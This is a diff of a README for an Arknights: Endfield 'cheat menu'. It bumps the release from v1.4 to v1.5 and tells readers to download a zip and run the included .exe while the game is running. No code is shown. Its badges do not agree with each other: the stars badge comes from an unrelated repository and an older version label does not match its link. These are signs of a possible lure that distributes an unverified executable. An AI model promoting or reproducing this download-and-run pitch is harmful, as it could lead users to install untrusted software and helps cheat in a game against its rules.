@@ -1,13 +1,13 @@
-# Arknights: Endfield Cheat & Mod Menu
+# Arknights: Endfield Cheat Menu
 
-(UPD: 23 Aug 2026)
+(UPD: 24 Aug 2026)
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/colonylegendsport/Endfield-Hack-V1/releases/download/v1.4/Endfield.Mod-v1.4.zip)
-[![GitHub release](https://img.shields.io/badge/Release-v1.3-blue?style=for-the-badge)](https://github.com/colonylegendsport/Endfield-Hack-V1/releases/download/v1.4/Endfield.Mod-v1.4.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/colonylegendsport/Endfield-Hack-V1/releases/download/v1.5/Endfield.GUI-v1.5.zip)
+[![GitHub release](https://img.shields.io/badge/Release-v1.5-blue?style=for-the-badge)](https://github.com/colonylegendsport/Endfield-Hack-V1/releases/download/v1.5/Endfield.GUI-v1.5.zip)
 [![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue?style=for-the-badge)](https://opensource.org/licenses/Apache-2.0)
 [![GitHub Stars](https://img.shields.io/github/stars/sglkc/endfield-auto-daily?style=for-the-badge&logo=github)](https://github.com/colonylegendsport/Endfield-Hack-V1/stargazers)
 
-A powerful trainer tool for Arknights: Endfield with clean in-game overlay
+
 
 ---
 
@@ -29,10 +29,10 @@ A powerful trainer tool for Arknights: Endfield with clean in-game overlay
 ---
 
 ## How to Install
-1. Download the [latest release build](https://github.com/colonylegendsport/Endfield-Hack-V1/releases/download/v1.4/Endfield.Mod-v1.4.zip) from repo's Releases page.
+1. Download the [latest release build](https://github.com/colonylegendsport/Endfield-Hack-V1/releases/download/v1.5/Endfield.GUI-v1.5.zip) from repo's Releases page.
 2. Extract the contents to any folder (e.g., `C:\Endfieldghghgh` or Desktop).
 3. Launch game.
-4. Run `Endfield_github-1.4.exe`.
+4. Run `Endfield_github-1.5.exe`.
 5. Enjoy. Press the toggle hotkey (default: `[Insert]`) to open the menu.
 
 ---
